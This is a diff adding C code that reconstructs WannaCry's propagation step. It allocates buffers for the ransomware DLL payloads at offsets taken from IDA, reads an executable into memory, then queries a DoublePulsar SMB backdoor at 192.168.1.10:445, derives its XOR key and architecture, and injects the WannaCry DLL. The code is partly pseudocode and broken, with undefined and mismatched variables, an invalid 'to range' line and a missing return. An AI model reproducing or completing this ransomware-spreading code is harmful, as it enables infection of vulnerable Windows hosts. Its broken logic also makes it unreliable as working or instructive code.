@@ -361,3 +361,72 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, uns
 	
 	GlobalFree(hMem);
 }
+
+
+
+
+//init the DLL building in memory here
+//EXE file global here
+HGLOBAL hDLL_x86;
+HGLOBAL hDLL_x64;
+
+//init the DLL payload here
+//read from Wannacry in IDA
+//also here: https://www.acronis.com/en-us/blog/posts/wannacry-attack-what-it-and-how-protect-your-computer
+HGLOBAL initialize_payload()
+{
+	/*
+	32-bit dll start address 0x40B020, size is 0x4060 bytes
+	64-bit dll start address 0x40F080, size is 0xc8a4 bytes
+	*/
+	DWORD NumberOfBytesRead;
+	DWORD fileSize;
+	//size = 0x4060 converted to decimal: 16480
+	//GlobalAlloc(GPTR, 5298176)
+	hDLL_x86 = GlobalAlloc(GMEM_ZEROINIT, 5298176); 
+	/* 0x50D000 found in IDA but most likely: 0x506000 for 32 bit */
+	
+	//size = 0xc8a4 converted to decimal: 51364
+	//GlobalAlloc(GPTR, 5298176)
+	hDLL_x64 = GlobalAlloc(GMEM_ZEROINIT, 5298176); //0x50D000 found in IDA
+	
+	//if no errors continue, otherwise close and abort()
+	if(hDLL_x86 || hDLL_x64)
+	{
+		//GENERIC_READ is 0x80000000 and GENERIC_WRITE is 0x40000000
+		HANDLE fileHandle = CreateFileA(Filename, 0x80000000, 1, NULL, 3, 4, NULL);
+		if(fileHandle != INVALID_FILE_HANDLE)
+		{
+			fileSize = GetFileSize(fileHandle, NULL);
+			EXE_BUFFER[0] = fileSize; //Dword length written here
+			ReadFile(fileHandle, EXE_BUFFER+4, &fileSize, &NumberOfBytesRead, 0);
+    			CloseHandle(fileHandle);
+		}
+	}
+	else
+	{
+		GlobalFree(hMemory_x86);
+		GlobalFree(hMemory_x64);
+	}
+}
+
+
+int main()
+{
+	//etc etc
+	//Send Packets to get DoublePulsar Information
+	unsigned char *recvbuff[4096];
+	SOCKET sSock;
+	GetInformationFromDoublePulsarBackdoor(sSock,&recvbuff,"192.168.1.10", 445);
+	
+	//doublePulsar is present
+	if(recvbuff[34] == 81)
+	{
+		//signature_long is psuedocode
+		signature_long = recvbuff[18] to range -> recvbuff[22];
+		ArchitectureType = ComputeDOUBLEPULSARArchitecture(signature, architecture_bit);
+          	XorKey = ComputeDOUBLEPULSARXorKey(signature_long);
+          	InjectWannaCryDLLViaDoublePulsarBackdoor(sSock, ArchitectureType, XorKey);	
+	}
+	return 0;
+}
